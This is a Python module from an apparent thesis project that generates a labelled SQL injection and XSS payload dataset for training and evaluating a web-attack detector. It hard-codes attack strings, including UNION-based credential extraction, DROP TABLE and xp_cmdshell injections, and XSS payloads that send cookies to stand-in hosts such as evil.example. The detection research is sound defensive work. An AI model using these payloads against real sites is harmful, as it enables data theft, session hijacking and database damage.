"""
dataset.py
----------
Builds the labelled dataset described in Chapter 3, Section 3.4.

IMPORTANT (read this before you defend the thesis):
This module ships with a *synthetic but realistic* payload generator so the
whole pipeline is runnable out of the box with zero external downloads.
For the real thesis submission you should replace / extend this with the
actual CSIC 2010 + OWASP payload-list data. See README.md ("Swapping in the
real CSIC 2010 / OWASP dataset") for exactly where to plug that in --
`load_csic2010()` and `load_owasp_payloads()` below are stubs with the
expected CSV schema already defined, so the rest of the pipeline
(tokenizer -> TF-IDF -> models -> evaluation -> realtime sniffer) does not
need to change at all once you drop in the real files.

Classes: benign, sqli, xss
"""

from __future__ import annotations

import random
from pathlib import Path

import pandas as pd

from src.obfuscation import random_obfuscate

RAW_DIR = Path(__file__).resolve().parent.parent / "data" / "raw"
PROCESSED_DIR = Path(__file__).resolve().parent.parent / "data" / "processed"

# --------------------------------------------------------------------------
# Synthetic corpus generation (default, works offline, no downloads needed)
# --------------------------------------------------------------------------

_BENIGN_TEMPLATES = [
    "id={n}", "page={n}", "sort=asc", "sort=desc", "q={word}", "search={word}",
    "category={word}", "limit={n}", "offset={n}", "user_id={n}", "lang=en",
    "lang=id", "ref={word}", "session={token}", "token={token}",
    "email={word}@example.com", "name={word}", "city={word}", "price_min={n}",
    "price_max={n}", "color={word}", "size=m", "format=json", "callback={word}",
    "redirect=/home", "tab={word}", "view=grid", "theme=dark", "currency=usd",
    "coupon={word}", "qty={n}",
]

_WORDS = [
    "laptop", "shoes", "book", "camera", "phone", "jakarta", "surakarta",
    "budget", "profile", "settings", "orders", "invoice", "report", "dashboard",
    "alice", "budi", "citra", "delta", "echo", "foxtrot",
]

_SQLI_TEMPLATES = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "admin' --",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT NULL, NULL, NULL --",
    "1' AND 1=1 --",
    "1' AND SLEEP(5) --",
    "'; DROP TABLE users; --",
    "' OR EXISTS(SELECT * FROM users) --",
    "1 OR 1=1",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "\" UNION SELECT table_name FROM information_schema.tables --",
    "') OR ('1'='1",
    "' OR SLEEP(5)='0",
    "1; EXEC xp_cmdshell('dir') --",
    "' HAVING 1=1 --",
    "' GROUP BY password HAVING 1=1 --",
    "' OR 'a'='a",
]

_XSS_TEMPLATES = [
    "<script>alert('xss')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert('xss')>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<input onfocus=alert(1) autofocus>",
    "<div onmouseover=alert(1)>hover</div>",
    "<script>document.location='http://evil.example/'+document.cookie</script>",
    "<script>fetch('http://evil.example/steal?c='+document.cookie)</script>",
    "<img src=x onerror=this.src='http://evil.example/'+document.cookie>",
    "<script>new Image().src='http://evil.example/?c='+document.cookie;</script>",
    "<video><source onerror=alert(1)></video>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<style>@import 'http://evil.example/xss.css';</style>",
]


def _fill_template(template: str, rng: random.Random) -> str:
    return template.format(
        n=rng.randint(1, 9999),
        word=rng.choice(_WORDS),
        token=f"{rng.randint(10**7, 10**8-1):x}",
    )


def _vary_malicious(payload: str, rng: random.Random) -> str:
    """Add light, realistic variation to a malicious template so the
    training corpus isn't just N exact copies of ~20 fixed strings.
    Keeps the attack pattern intact -- only touches incidental details
    (comment text, numeric literals, domain names) that real attackers
    also vary between attempts."""
    variants = [payload]
    if "1=1" in payload:
        variants.append(payload.replace("1=1", f"{rng.randint(1,9)}={rng.randint(1,9)}" if rng.random() < 0.3 else "1=1"))
    if "evil.example" in payload:
        variants.append(payload.replace("evil.example", rng.choice(["attacker.test", "bad-host.example", "c2.example"])))
    if "SLEEP(5)" in payload:
        variants.append(payload.replace("SLEEP(5)", f"SLEEP({rng.randint(2,10)})"))
    return rng.choice(variants)


def generate_synthetic_corpus(
    n_benign: int = 1200,
    n_sqli: int = 500,
    n_xss: int = 500,
    seed: int = 42,
) -> pd.DataFrame:
    """Generate a labelled synthetic payload corpus: columns [payload, label].

    Benign samples are template-filled query strings (deduplicated, since
    exact duplicate benign requests carry no extra training signal).
    SQLi/XSS samples are drawn (with repetition + light randomization) from
    well-known, publicly-documented attack pattern families, consistent
    with the OWASP payload categories referenced in Chapter 3. Malicious
    rows are intentionally NOT deduplicated: repeated exposure to the same
    attack string, and realistically-varied minor details, both mirror real
    attack logs and give the vectorizer/classifiers enough signal to learn
    from a small set of template families.
    """
    rng = random.Random(seed)
    rows = []

    for _ in range(n_benign):
        combo = rng.sample(_BENIGN_TEMPLATES, k=rng.randint(1, 3))
        payload = "&".join(_fill_template(t, rng) for t in combo)
        rows.append({"payload": payload, "label": "benign"})

    benign_df = pd.DataFrame(rows).drop_duplicates(subset="payload").reset_index(drop=True)

    malicious_rows = []
    for _ in range(n_sqli):
        base = rng.choice(_SQLI_TEMPLATES)
        malicious_rows.append({"payload": _vary_malicious(base, rng), "label": "sqli"})

    for _ in range(n_xss):
        base = rng.choice(_XSS_TEMPLATES)
        malicious_rows.append({"payload": _vary_malicious(base, rng), "label": "xss"})

    malicious_df = pd.DataFrame(malicious_rows)

    df = pd.concat([benign_df, malicious_df], ignore_index=True)
    df = df.sample(frac=1.0, random_state=seed).reset_index(drop=True)
    return df


# --------------------------------------------------------------------------
# Stubs for the real CSIC 2010 / OWASP data (see README for download links)
# --------------------------------------------------------------------------

def load_csic2010(csv_path: Path | None = None) -> pd.DataFrame:
    """
    Expected schema once you export/convert the CSIC 2010 dataset to CSV:
        columns = ["payload", "label"]   where label in {"benign","sqli","xss","other"}
    Rows labelled "other" (non-SQLi/XSS anomalies in CSIC2010) are dropped
    upstream in build_dataset() since Chapter 1 scopes the study to SQLi/XSS.
    """
    csv_path = csv_path or (RAW_DIR / "csic2010.csv")
    if not csv_path.exists():
        raise FileNotFoundError(
            f"{csv_path} not found. Download/convert CSIC 2010 first -- "
            f"see README.md section 'Swapping in the real dataset'."
        )
    return pd.read_csv(csv_path)


def load_owasp_payloads(csv_path: Path | None = None) -> pd.DataFrame:
    """
    Expected schema for OWASP / payloadbox-style payload lists exported to CSV:
        columns = ["payload", "label"]   where label in {"sqli","xss"}
    """
    csv_path = csv_path or (RAW_DIR / "owasp_payloads.csv")
    if not csv_path.exists():
        raise FileNotFoundError(
            f"{csv_path} not found. Download OWASP payload lists first -- "
            f"see README.md section 'Swapping in the real dataset'."
        )
    return pd.read_csv(csv_path)


# --------------------------------------------------------------------------
# Newer, more widely-used Kaggle datasets (recommended over raw CSIC2010):
#   - "SQL Injection Dataset" by Syed Saqlain Hussain Shah (2021, ~33.7k rows)
#     https://www.kaggle.com/datasets/syedsaqlainhussain/sql-injection-dataset
#   - "Cross Site Scripting (XSS) dataset for Deep Learning" by the same
#     author (2020, ~13.7k rows, sourced from PortSwigger + OWASP Cheat Sheets)
#     https://www.kaggle.com/datasets/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning
#
# These are cited across several 2024-2025 papers referenced in Chapter 2
# and are much easier to work with than raw CSIC2010 (single flat CSV,
# already payload+label). Column names vary slightly between re-uploads of
# these datasets, so this loader auto-detects them instead of assuming one
# fixed schema.
# --------------------------------------------------------------------------

_PAYLOAD_COL_CANDIDATES = ["payload", "query", "sentence", "text", "sql_query", "input"]
_LABEL_COL_CANDIDATES = ["label", "Label", "type", "class"]


def _autodetect_columns(df: pd.DataFrame) -> tuple[str, str]:
    cols_lower = {c.lower(): c for c in df.columns}
    payload_col = next((cols_lower[c] for c in _PAYLOAD_COL_CANDIDATES if c in cols_lower), None)
    label_col = next((cols_lower[c.lower()] for c in _LABEL_COL_CANDIDATES if c.lower() in cols_lower), None)
    if payload_col is None or label_col is None:
        raise ValueError(
            f"Could not auto-detect payload/label columns from {list(df.columns)}. "
            f"Rename them to 'payload' and 'label' manually, or edit "
            f"_PAYLOAD_COL_CANDIDATES / _LABEL_COL_CANDIDATES in src/dataset.py."
        )
    return payload_col, label_col


def load_kaggle_sqli(csv_path: Path | None = None) -> pd.DataFrame:
    """
    Loads the Syed Saqlain Hussain Shah 'SQL Injection Dataset' from Kaggle.
    Download the CSV manually (Kaggle requires login) and place it at
    data/raw/kaggle_sqli.csv -- see README.md.

    Handles both common label encodings seen in re-uploads of this dataset:
    binary (0=benign, 1=sqli) or already-string ("SQLi"/"Normal" etc.).
    """
    csv_path = csv_path or (RAW_DIR / "kaggle_sqli.csv")
    if not csv_path.exists():
        raise FileNotFoundError(
            f"{csv_path} not found. Download from "
            f"https://www.kaggle.com/datasets/syedsaqlainhussain/sql-injection-dataset "
            f"and save as data/raw/kaggle_sqli.csv -- see README.md."
        )
    raw = pd.read_csv(csv_path, encoding="utf-8", encoding_errors="replace")
    payload_col, label_col = _autodetect_columns(raw)

    def _normalize_label(v) -> str:
        s = str(v).strip().lower()
        if s in ("1", "sqli", "sql injection", "malicious", "attack", "true"):
            return "sqli"
        return "benign"

    out = pd.DataFrame({
        "payload": raw[payload_col].astype(str),
        "label": raw[label_col].map(_normalize_label),
    })
    return out.dropna(subset=["payload"]).reset_index(drop=True)


def load_kaggle_xss(csv_path: Path | None = None) -> pd.DataFrame:
    """
    Loads the Syed Saqlain Hussain Shah 'Cross Site Scripting (XSS) dataset
    for Deep Learning' from Kaggle. Download manually and place at
    data/raw/kaggle_xss.csv -- see README.md.
    """
    csv_path = csv_path or (RAW_DIR / "kaggle_xss.csv")
    if not csv_path.exists():
        raise FileNotFoundError(
            f"{csv_path} not found. Download from "
            f"https://www.kaggle.com/datasets/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning "
            f"and save as data/raw/kaggle_xss.csv -- see README.md."
        )
    raw = pd.read_csv(csv_path, encoding="utf-8", encoding_errors="replace")
    payload_col, label_col = _autodetect_columns(raw)

    def _normalize_label(v) -> str:
        s = str(v).strip().lower()
        if s in ("1", "xss", "malicious", "attack", "true"):
            return "xss"
        return "benign"

    out = pd.DataFrame({
        "payload": raw[payload_col].astype(str),
        "label": raw[label_col].map(_normalize_label),
    })
    return out.dropna(subset=["payload"]).reset_index(drop=True)


def load_combined_dataset(use_real_data: bool = False, seed: int = 42, source: str = "kaggle") -> pd.DataFrame:
    """
    Main entry point. If use_real_data=True, loads real data and merges it.

    source="kaggle" (recommended, default): loads data/raw/kaggle_sqli.csv +
        data/raw/kaggle_xss.csv (the newer, actively-used datasets above).
    source="csic": loads data/raw/csic2010.csv + data/raw/owasp_payloads.csv
        (the original CSIC2010 + OWASP-payload-list combination).

    Falls back to the synthetic generator if the requested files aren't
    found, so the pipeline always runs regardless.
    """
    if use_real_data:
        frames = []
        if source == "kaggle":
            for loader in (load_kaggle_sqli, load_kaggle_xss):
                try:
                    frames.append(loader())
                except FileNotFoundError as e:
                    print(f"[dataset] {e}")
        elif source == "csic":
            for loader in (load_csic2010, load_owasp_payloads):
                try:
                    frames.append(loader())
                except FileNotFoundError as e:
                    print(f"[dataset] {e}")
        else:
            raise ValueError(f"Unknown source={source!r}, expected 'kaggle' or 'csic'")

        if frames:
            df = pd.concat(frames, ignore_index=True)
            df = df[df["label"].isin(["benign", "sqli", "xss"])]
            benign = df[df["label"] == "benign"].drop_duplicates(subset="payload")
            malicious = df[df["label"] != "benign"]
            df = pd.concat([benign, malicious], ignore_index=True)
            return df.sample(frac=1.0, random_state=seed).reset_index(drop=True)
        print("[dataset] No real data found, falling back to synthetic corpus.")

    return generate_synthetic_corpus(seed=seed)


# --------------------------------------------------------------------------
# Train / test split + obfuscated augmentation (Section 3.4)
# --------------------------------------------------------------------------

def build_dataset(
    use_real_data: bool = False,
    test_size: float = 0.25,
    seed: int = 42,
    source: str = "kaggle",
) -> dict[str, pd.DataFrame]:
    """
    Produces three partitions, matching Section 3.4 of the thesis:
      - train             : clean payloads only (fits vectorizer + models)
      - test_clean        : held-out clean payloads (in-distribution test)
      - test_obfuscated   : malicious payloads from test_clean, run through
                             random_obfuscate() (evasion-robustness test)

    Benign payloads are never obfuscated (obfuscation techniques here only
    make sense for/target malicious syntax), so test_obfuscated only
    contains sqli/xss rows plus the same benign rows as test_clean, keeping
    class balance comparable between the two test partitions.
    """
    df = load_combined_dataset(use_real_data=use_real_data, seed=seed, source=source)
    rng = random.Random(seed)

    df = df.sample(frac=1.0, random_state=seed).reset_index(drop=True)
    n_test = int(len(df) * test_size)
    test_df = df.iloc[:n_test].reset_index(drop=True)
    train_df = df.iloc[n_test:].reset_index(drop=True)

    obf_rows = []
    for _, row in test_df.iterrows():
        if row["label"] in ("sqli", "xss"):
            obf_payload, techniques = random_obfuscate(row["payload"], seed=rng.randint(0, 10**6))
            obf_rows.append({
                "payload": obf_payload,
                "label": row["label"],
                "techniques": "+".join(techniques),
            })
        else:
            obf_rows.append({"payload": row["payload"], "label": row["label"], "techniques": ""})
    test_obfuscated_df = pd.DataFrame(obf_rows)

    return {
        "train": train_df,
        "test_clean": test_df,
        "test_obfuscated": test_obfuscated_df,
    }


def save_partitions(partitions: dict[str, pd.DataFrame], out_dir: Path = PROCESSED_DIR) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    for name, df in partitions.items():
        path = out_dir / f"{name}.csv"
        df.to_csv(path, index=False)
        print(f"[dataset] wrote {path}  ({len(df)} rows)")


if __name__ == "__main__":
    parts = build_dataset()
    for name, df in parts.items():
        print(f"\n{name}: {len(df)} rows")
        print(df["label"].value_counts())
    save_partitions(parts)
